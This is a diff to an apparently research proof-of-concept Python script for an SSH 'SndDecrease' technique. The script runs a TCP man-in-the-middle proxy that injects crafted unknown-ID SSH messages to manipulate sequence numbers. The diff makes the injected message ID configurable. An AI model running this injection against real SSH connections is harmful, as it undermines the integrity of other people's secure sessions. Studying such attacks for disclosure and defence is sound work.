@@ -21,7 +21,7 @@ from common import contains_newkeys, run_tcp_mitm
 ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
 #####################################################################################
 
-rogue_unknown_msg = unhexlify('0000000C060900000000000000000000')
+rogue_unknown_msg_hex = '0000000C06{}00000000000000000000'
 rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
 technique_in_progress = False
 
@@ -31,12 +31,14 @@ technique_in_progress = False
 @click.option("--server-ip", help="The IP address where the SSH server is running.")
 @click.option("--server-port", default=22, help="The port where the SSH server is running.")
 @click.option("-N", "--decrease-by", default=1, help="The number by which C.Snd will be decreased.")
-def cli(proxy_ip, proxy_port, server_ip, server_port, decrease_by):
+@click.option("--unknown-id", default="09", help="The message ID (in hex) of a message unknown to the implementation")
+def cli(proxy_ip, proxy_port, server_ip, server_port, decrease_by, unknown_id):
     print("--- Proof of Concept for SndDecrease technique ---", flush=True)
     print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.", flush=True)
-    run_tcp_mitm(proxy_ip, proxy_port, server_ip, server_port, forward_server_to_client=lambda in_socket, out_socket: inject_snddecrease(in_socket, out_socket, decrease_by), forward_client_to_server=pipe_discard_during_technique)
+    rogue_unknown_msg = unhexlify(rogue_unknown_msg_hex.format(unknown_id))
+    run_tcp_mitm(proxy_ip, proxy_port, server_ip, server_port, forward_server_to_client=lambda in_socket, out_socket: inject_snddecrease(in_socket, out_socket, decrease_by, rogue_unknown_msg), forward_client_to_server=pipe_discard_during_technique)
 
-def inject_snddecrease(in_socket, out_socket, decrease_by):
+def inject_snddecrease(in_socket, out_socket, decrease_by, rogue_unknown_msg):
     global technique_in_progress
     try:
         while True:
